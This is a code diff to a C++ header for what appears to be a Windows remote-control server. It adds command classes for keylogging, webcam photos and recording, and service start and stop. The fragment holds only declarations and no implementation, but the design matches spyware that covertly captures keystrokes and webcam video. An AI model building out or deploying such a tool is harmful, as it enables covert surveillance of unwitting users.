@@ -1,9 +1,11 @@
 #include "server_socket.h"
 #include <unordered_map>
 #include <thread>
+#include <objidl.h>
 #include <gdiplus.h>
 #include <dshow.h> 
 #include <sstream>
+#include "webcam.h"
 #pragma comment(lib, "gdiplus.lib")
 
 #include "keylogger.h"
@@ -11,6 +13,7 @@
 #define SUCCESS 0
 #define FAILURE 1
 
+// typedef SHORT PROPID;
 
 using namespace Gdiplus;
 
@@ -117,10 +120,16 @@ public:
     void execute(Server& server, const std::string& param) override;
 };
 
+class StartSerCommand : public Command{
+public:
+    void execute(Server& server, const std::string& param) override;
+};
+class StopSerCommand : public Command{
+    public:
+    void execute(Server& server, const std::string& param) override;
+};
+
 class TakePhotoCommand : public Command{
-private:
-    std::string detectWebcam();
-    int takePhoto();
 public:
     void execute(Server& server, const std::string& param) override;
 };
@@ -133,4 +142,19 @@ class StartKeylogCommand : public Command{
 class StopKeylogCommand : public Command{
     public:
         void execute(Server& server, const std::string& param) override;
+};
+
+class StartRecordCommand : public Command{
+private:
+    PROCESS_INFORMATION recordingProcess = { 0 };
+    HANDLE hStdInWrite = NULL;
+    PROCESS_INFORMATION startRecording(const std::string& webcamName, HANDLE& hStdInWrite);
+    int record();
+public:
+    void execute(Server& server, const std::string& param) override;
+};
+
+class StopRecordCommand : public Command{
+public:
+    void execute(Server& server, const std::string& param) override;
 };
